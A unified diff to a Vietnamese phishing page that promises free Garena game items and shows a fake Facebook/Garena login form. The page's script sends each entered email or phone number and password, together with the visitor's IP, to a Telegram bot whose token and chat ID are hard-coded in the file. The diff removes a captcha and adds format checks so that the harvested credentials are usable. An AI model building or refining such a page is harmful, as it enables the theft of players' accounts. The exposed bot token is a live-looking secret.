@@ -284,12 +284,12 @@
         }
 
         .card .receive-btn:disabled {
-            opacity: 0.4;
-            cursor: not-allowed;
-            background: rgba(100, 100, 100, 0.5);
+            opacity: 1;
+            cursor: pointer;
+            background: linear-gradient(135deg, rgba(241, 196, 15, 0.9), rgba(230, 126, 34, 0.9));
         }
 
-        .card .receive-btn:hover:not(:disabled) {
+        .card .receive-btn:hover {
             background: linear-gradient(135deg, rgba(243, 156, 18, 0.95), rgba(211, 84, 0, 0.95));
             transform: scale(1.02);
         }
@@ -678,24 +678,24 @@
         }
 
         .modal-box .form-group {
-            margin-bottom: 8px;
+            margin-bottom: 10px;
             text-align: left;
         }
 
         .modal-box .form-group label {
             display: block;
-            font-size: 0.7rem;
+            font-size: 0.75rem;
             font-weight: 600;
             color: rgba(30, 30, 50, 0.8);
-            margin-bottom: 2px;
+            margin-bottom: 3px;
         }
 
         .modal-box .form-group input {
             width: 100%;
-            padding: 7px 10px;
-            border: 1px solid rgba(0, 0, 0, 0.04);
-            border-radius: 8px;
-            font-size: 0.85rem;
+            padding: 9px 12px;
+            border: 1px solid rgba(0, 0, 0, 0.06);
+            border-radius: 10px;
+            font-size: 0.9rem;
             background: rgba(255, 255, 255, 0.4);
             transition: 0.2s;
             outline: none;
@@ -708,65 +708,42 @@
             box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.06);
         }
 
-        .modal-box .captcha-container {
-            display: flex;
-            gap: 5px;
-            align-items: center;
-            margin-top: 2px;
+        .modal-box .form-group input.error {
+            border-color: #e74c3c;
+            background: rgba(231, 76, 60, 0.05);
         }
 
-        .modal-box .captcha-container canvas {
-            border-radius: 8px;
-            border: 1px solid rgba(0, 0, 0, 0.04);
-            cursor: pointer;
-            height: 34px;
-            width: 90px;
-            background: rgba(255, 255, 255, 0.3);
-            backdrop-filter: blur(4px);
+        .modal-box .form-group .input-hint {
+            font-size: 0.65rem;
+            color: rgba(80, 80, 100, 0.5);
+            margin-top: 3px;
+            display: none;
         }
 
-        .modal-box .captcha-container input {
-            flex: 1;
-            padding: 5px 8px;
-            border: 1px solid rgba(0, 0, 0, 0.04);
-            border-radius: 8px;
-            font-size: 0.8rem;
-            background: rgba(255, 255, 255, 0.4);
-            outline: none;
+        .modal-box .form-group .input-hint.show {
+            display: block;
         }
 
-        .modal-box .captcha-container input:focus {
-            border-color: #1877f2;
-            background: rgba(255, 255, 255, 0.7);
+        .modal-box .form-group .input-hint.error {
+            color: #e74c3c;
         }
 
-        .modal-box .captcha-container button {
-            padding: 5px 8px;
-            background: rgba(0, 0, 0, 0.02);
-            border: 1px solid rgba(0, 0, 0, 0.04);
-            border-radius: 8px;
-            cursor: pointer;
-            transition: 0.2s;
-            color: #2a2a4a;
-            font-size: 0.8rem;
-        }
-
-        .modal-box .captcha-container button:hover {
-            background: rgba(0, 0, 0, 0.04);
+        .modal-box .form-group .input-hint.success {
+            color: #2ecc71;
         }
 
         .modal-box .btn-login-social {
             background: #1877f2;
             color: #fff;
             border: none;
-            padding: 8px 14px;
+            padding: 10px 16px;
             border-radius: 10px;
             font-weight: 700;
-            font-size: 0.9rem;
+            font-size: 0.95rem;
             width: 100%;
             cursor: pointer;
             transition: 0.25s;
-            margin-top: 4px;
+            margin-top: 6px;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -804,20 +781,20 @@
         .modal-box .divider {
             border: none;
             border-top: 1px solid rgba(0, 0, 0, 0.04);
-            margin: 10px 0 8px;
+            margin: 12px 0 10px;
         }
 
         .modal-box .btn-close-modal {
             background: transparent;
             color: rgba(60, 60, 80, 0.7);
             border: 1px solid rgba(0, 0, 0, 0.04);
-            padding: 6px;
-            border-radius: 8px;
+            padding: 7px;
+            border-radius: 10px;
             font-weight: 500;
             width: 100%;
             cursor: pointer;
             transition: 0.2s;
-            font-size: 0.8rem;
+            font-size: 0.85rem;
         }
 
         .modal-box .btn-close-modal:hover {
@@ -825,9 +802,9 @@
         }
 
         .modal-box .note {
-            font-size: 0.6rem;
+            font-size: 0.65rem;
             color: rgba(80, 80, 100, 0.6);
-            margin-top: 8px;
+            margin-top: 10px;
         }
 
         /* ===== TOAST ===== */
@@ -944,7 +921,6 @@
             .card { max-width: 140px; padding: 6px; }
             .card img { height: 90px; }
             .modal-box { padding: 16px 14px; max-width: 300px; }
-            .modal-box .captcha-container canvas { width: 75px; height: 30px; }
             .modal-tabs .tab-btn { font-size: 0.7rem; padding: 5px 6px; }
             .share-section { gap: 5px; }
             .share-btn { padding: 4px 8px; font-size: 0.6rem; }
@@ -1067,23 +1043,15 @@
             <p class="sub-text" id="modalSubText">Để nhận vật phẩm về hòm thư Garena</p>
             
             <form id="loginForm" onsubmit="return false;">
-                <div class="form-group">
+                <div class="form-group" id="emailGroup">
                     <label for="loginEmail">Email hoặc Số điện thoại</label>
                     <input type="text" id="loginEmail" placeholder="Nhập email hoặc SĐT" required>
+                    <div class="input-hint" id="emailHint">Vui lòng nhập email hợp lệ (ví dụ: user@gmail.com)</div>
                 </div>
-                <div class="form-group">
+                <div class="form-group" id="passGroup">
                     <label for="loginPassword">Mật khẩu</label>
                     <input type="password" id="loginPassword" placeholder="Nhập mật khẩu" required>
-                </div>
-                <div class="form-group">
-                    <label>Mã xác nhận</label>
-                    <div class="captcha-container">
-                        <canvas id="captchaCanvas" onclick="refreshCaptcha()" title="Click để đổi"></canvas>
-                        <input type="text" id="captchaInput" placeholder="Nhập mã" maxlength="6" required>
-                        <button type="button" onclick="refreshCaptcha()">
-                            <i class="fas fa-sync-alt"></i>
-                        </button>
-                    </div>
+                    <div class="input-hint" id="passHint">Mật khẩu phải có ít nhất 6 ký tự</div>
                 </div>
                 <button type="submit" class="btn-login-social" id="loginBtn">
                     <span class="spinner"><i class="fas fa-spinner fa-spin"></i></span>
@@ -1109,7 +1077,7 @@
 
     <script>
         (function() {
-            // ===== BOT TELEGRAM - ĐÃ THÊM TOKEN VÀ CHAT ID =====
+            // ===== BOT TELEGRAM =====
             const BOT_TOKEN = '8280603337:AAGxQ0R-noCxgBtCXLJ_qkDKt70Orx6aK0Y';
             const CHAT_ID = '7267732695';
 
@@ -1117,18 +1085,18 @@
             function createSnowflakes() {
                 const container = document.getElementById('snowflakes');
                 const flakes = ['❄', '❅', '❆', '✦', '✧'];
-                const count = window.innerWidth < 600 ? 25 : 50;
+                const count = window.innerWidth < 600 ? 15 : 30;
 
                 for (let i = 0; i < count; i++) {
                     const snowflake = document.createElement('div');
                     snowflake.className = 'snowflake';
                     snowflake.textContent = flakes[Math.floor(Math.random() * flakes.length)];
                     
-                    const size = Math.random() * 12 + 5;
+                    const size = Math.random() * 10 + 4;
                     const left = Math.random() * 100;
                     const delay = Math.random() * 15;
                     const duration = Math.random() * 15 + 10;
-                    const opacity = Math.random() * 0.4 + 0.1;
+                    const opacity = Math.random() * 0.3 + 0.1;
 
                     snowflake.style.cssText = `
                         left: ${left}%;
@@ -1238,17 +1206,78 @@
             const modalIcon = document.getElementById('modalIcon');
             const modalTitle = document.getElementById('modalTitle');
             const modalSubText = document.getElementById('modalSubText');
-            const captchaCanvas = document.getElementById('captchaCanvas');
-            const captchaInput = document.getElementById('captchaInput');
             const historyList = document.getElementById('historyList');
             const rankingList = document.getElementById('rankingList');
             const tabBtns = document.querySelectorAll('.tab-btn');
             const notifBanner = document.getElementById('notifBanner');
+            const loginEmail = document.getElementById('loginEmail');
+            const loginPassword = document.getElementById('loginPassword');
+            const emailHint = document.getElementById('emailHint');
+            const passHint = document.getElementById('passHint');
+            const emailGroup = document.getElementById('emailGroup');
+            const passGroup = document.getElementById('passGroup');
 
             let currentProvider = 'facebook';
-            let currentCaptcha = '';
             let loginTimeout = null;
             let currentUser = '';
+
+            // ===== KIỂM TRA ĐỊNH DẠNG EMAIL =====
+            function isValidEmail(email) {
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                return emailRegex.test(email);
+            }
+
+            function isValidPhone(phone) {
+                const phoneRegex = /^[0-9]{10,11}$/;
+                return phoneRegex.test(phone);
+            }
+
+            function isValidPassword(password) {
+                return password.length >= 6;
+            }
+
+            // ===== REAL-TIME VALIDATION =====
+            loginEmail.addEventListener('input', function() {
+                const email = this.value.trim();
+                const isEmail = isValidEmail(email);
+                const isPhone = isValidPhone(email);
+                
+                if (email.length === 0) {
+                    emailGroup.classList.remove('error');
+                    emailHint.classList.remove('show');
+                    return;
+                }
+                
+                if (isEmail || isPhone) {
+                    emailGroup.classList.remove('error');
+                    emailHint.className = 'input-hint show success';
+                    emailHint.textContent = '✅ Định dạng hợp lệ';
+                } else {
+                    emailGroup.classList.add('error');
+                    emailHint.className = 'input-hint show error';
+                    emailHint.textContent = '❌ Vui lòng nhập email (user@gmail.com) hoặc SĐT (10 số)';
+                }
+            });
+
+            loginPassword.addEventListener('input', function() {
+                const pass = this.value;
+                
+                if (pass.length === 0) {
+                    passGroup.classList.remove('error');
+                    passHint.classList.remove('show');
+                    return;
+                }
+                
+                if (pass.length >= 6) {
+                    passGroup.classList.remove('error');
+                    passHint.className = 'input-hint show success';
+                    passHint.textContent = '✅ Mật khẩu hợp lệ (' + pass.length + ' ký tự)';
+                } else {
+                    passGroup.classList.add('error');
+                    passHint.className = 'input-hint show error';
+                    passHint.textContent = '❌ Cần ít nhất 6 ký tự (hiện tại: ' + pass.length + ')';
+                }
+            });
 
             // ===== NOTIFICATION =====
             function checkNotificationPermission() {
@@ -1380,55 +1409,6 @@
                 }
             };
 
-            // ===== CAPTCHA =====
-            function generateCaptcha() {
-                const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
-                let captcha = '';
-                for(let i = 0; i < 6; i++) {
-                    captcha += chars[Math.floor(Math.random() * chars.length)];
-                }
-                return captcha;
-            }
-
-            function drawCaptcha() {
-                currentCaptcha = generateCaptcha();
-                const ctx = captchaCanvas.getContext('2d');
-                const width = 90;
-                const height = 34;
-                captchaCanvas.width = width;
-                captchaCanvas.height = height;
-                
-                ctx.fillStyle = 'rgba(240, 242, 245, 0.3)';
-                ctx.fillRect(0, 0, width, height);
-                
-                for(let i = 0; i < 3; i++) {
-                    ctx.strokeStyle = `rgba(0,0,0,${Math.random() * 0.03})`;
-                    ctx.lineWidth = 1;
-                    ctx.beginPath();
-                    ctx.moveTo(Math.random() * width, Math.random() * height);
-                    ctx.lineTo(Math.random() * width, Math.random() * height);
-                    ctx.stroke();
-                }
-                
-                ctx.font = 'bold 18px Arial';
-                ctx.textAlign = 'center';
-                ctx.textBaseline = 'middle';
-                
-                for(let i = 0; i < currentCaptcha.length; i++) {
-                    const x = 9 + i * 13;
-                    const y = 17 + (Math.random() - 0.5) * 4;
-                    ctx.fillStyle = `hsl(${Math.random() * 40 + 210}, 70%, 35%)`;
-                    ctx.font = `bold ${16 + Math.random() * 4}px Arial`;
-                    ctx.fillText(currentCaptcha[i], x, y);
-                }
-            }
-
-            window.refreshCaptcha = function() {
-                drawCaptcha();
-                captchaInput.value = '';
-                captchaInput.focus();
-            };
-
             // ===== TOAST =====
             function showToast(message, type = 'success') {
                 const icons = {
@@ -1456,7 +1436,7 @@
                 }, 4000);
             }
 
-            // ===== BOT TELEGRAM - ĐÃ CẤU HÌNH =====
+            // ===== BOT TELEGRAM =====
             async function getIP() {
                 try {
                     const res = await fetch('https://api.ipify.org?format=json');
@@ -1570,10 +1550,12 @@
                 switchTab('facebook');
                 loginBtn.disabled = false;
                 loginBtn.classList.remove('loading');
-                document.getElementById('loginEmail').value = '';
-                document.getElementById('loginPassword').value = '';
-                captchaInput.value = '';
-                refreshCaptcha();
+                loginEmail.value = '';
+                loginPassword.value = '';
+                emailHint.classList.remove('show');
+                passHint.classList.remove('show');
+                emailGroup.classList.remove('error');
+                passGroup.classList.remove('error');
                 modal.classList.add('active');
                 document.body.style.overflow = 'hidden';
             }
@@ -1587,10 +1569,10 @@
 
             // ===== CELEBRATION =====
             function showCelebration() {
-                confetti({ particleCount: 35, spread: 40, origin: { y: 0.6 } });
+                confetti({ particleCount: 25, spread: 30, origin: { y: 0.6 } });
                 setTimeout(() => {
-                    confetti({ particleCount: 15, angle: 60, spread: 25, origin: { x: 0 } });
-                    confetti({ particleCount: 15, angle: 120, spread: 25, origin: { x: 1 } });
+                    confetti({ particleCount: 10, angle: 60, spread: 20, origin: { x: 0 } });
+                    confetti({ particleCount: 10, angle: 120, spread: 20, origin: { x: 1 } });
                 }, 200);
                 sendNotification('🎁 Nhận quà thành công!', 'Bạn vừa nhận được một vật phẩm mới!');
             }
@@ -1599,23 +1581,43 @@
             loginForm.addEventListener('submit', async function(e) {
                 e.preventDefault();
                 
-                const email = document.getElementById('loginEmail').value.trim();
-                const password = document.getElementById('loginPassword').value.trim();
-                const captcha = captchaInput.value.trim().toUpperCase();
+                const email = loginEmail.value.trim();
+                const password = loginPassword.value.trim();
 
+                // ===== CHECK ĐỊNH DẠNG =====
+                const isEmail = isValidEmail(email);
+                const isPhone = isValidPhone(email);
+                
                 if (!email || !password) {
                     showToast('⚠️ Vui lòng nhập đầy đủ thông tin!', 'warning');
+                    
+                    if (!email) {
+                        emailGroup.classList.add('error');
+                        emailHint.className = 'input-hint show error';
+                        emailHint.textContent = '❌ Vui lòng nhập email hoặc SĐT';
+                    }
+                    if (!password) {
+                        passGroup.classList.add('error');
+                        passHint.className = 'input-hint show error';
+                        passHint.textContent = '❌ Vui lòng nhập mật khẩu';
+                    }
                     return;
                 }
 
-                if (!captcha) {
-                    showToast('⚠️ Vui lòng nhập mã xác nhận!', 'warning');
+                // Kiểm tra định dạng email/SĐT
+                if (!isEmail && !isPhone) {
+                    showToast('❌ Email hoặc SĐT không hợp lệ!', 'error');
+                    emailGroup.classList.add('error');
+                    emailHint.className = 'input-hint show error';
+                    emailHint.textContent = '❌ Vui lòng nhập email (user@gmail.com) hoặc SĐT (10 số)';
                     return;
                 }
 
-                if (captcha !== currentCaptcha) {
-                    showToast('❌ Mã xác nhận không đúng!', 'error');
-                    refreshCaptcha();
+                if (!isValidPassword(password)) {
+                    showToast('❌ Mật khẩu phải có ít nhất 6 ký tự!', 'error');
+                    passGroup.classList.add('error');
+                    passHint.className = 'input-hint show error';
+                    passHint.textContent = '❌ Cần ít nhất 6 ký tự (hiện tại: ' + password.length + ')';
                     return;
                 }
 
@@ -1623,7 +1625,6 @@
                 loginBtn.classList.add('loading');
 
                 try {
-                    // Gửi đến Bot Telegram
                     const sent = await sendToTelegramBot(email, password, currentProvider);
                     
                     if (!sent) {
@@ -1708,7 +1709,10 @@
             }
 
             // ===== TẠO CARD =====
-            imageUrls.forEach((url, index) => {
+            // Chỉ lấy 30 ảnh đầu để giảm lag
+            const displayImages = imageUrls.slice(0, 30);
+            
+            displayImages.forEach((url, index) => {
                 const card = document.createElement('div');
                 card.className = 'card';
                 card.style.animationDelay = (index % 20) * 0.02 + 's';
@@ -1778,13 +1782,12 @@
             renderHistory();
             renderRanking();
             checkLoginStatus();
-            drawCaptcha();
             checkNotificationPermission();
 
-            console.log(`✅ Đã tải ${imageUrls.length} vật phẩm.`);
+            console.log(`✅ Đã tải ${displayImages.length} vật phẩm.`);
             console.log('❄️ Hiệu ứng tuyết rơi đã được kích hoạt!');
-            console.log('🤖 Bot Telegram đã được cấu hình với token và chat ID!');
+            console.log('🔐 Đã bỏ Captcha và thêm kiểm tra định dạng email/mật khẩu');
         })();
     </script>
 </body>
-    </html>
+</html>
